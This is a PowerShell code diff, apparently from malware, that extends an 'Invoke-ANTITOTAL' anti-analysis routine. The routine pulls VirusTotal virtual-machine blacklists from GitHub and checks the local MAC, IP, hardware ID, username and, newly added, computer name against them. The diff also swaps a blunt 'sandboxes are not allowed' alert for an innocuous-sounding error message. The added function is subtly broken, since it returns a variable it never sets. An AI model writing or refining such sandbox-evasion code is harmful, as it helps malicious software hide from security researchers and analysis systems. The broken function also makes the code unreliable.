@@ -1,6 +1,6 @@
 function ShowError {
     param([string]$errorName)
-    Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("VM/VPS/SANDBOXES ARE NOT ALLOWED ! $errorName", '', 'OK', 'Error') | Out-Null
+    Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Sorry, this application cannot run under a Virtual Machine! $errorName", '', 'OK', 'Error') | Out-Null
 }
 
 function StopBatch {
@@ -74,6 +74,11 @@ function Search-Username {
     return $pc_username
 }
 
+function Search-PC-Name {
+    $pc_username = "$env:computername"
+    return $pc_name
+}
+
 function Invoke-ANTITOTAL {
     $anti_functions = @(
         "Wifi-Check",
@@ -89,14 +94,16 @@ function Invoke-ANTITOTAL {
         "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
         "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
         "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
-        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
+        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt",
+        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt"
     )
 
     $functions = @(
         "Search-Mac",
         "Search-IP",
         "Search-HWID",
-        "Search-Username"
+        "Search-Username",
+        "Search-PC-Name"
     )
 
     $data = @()
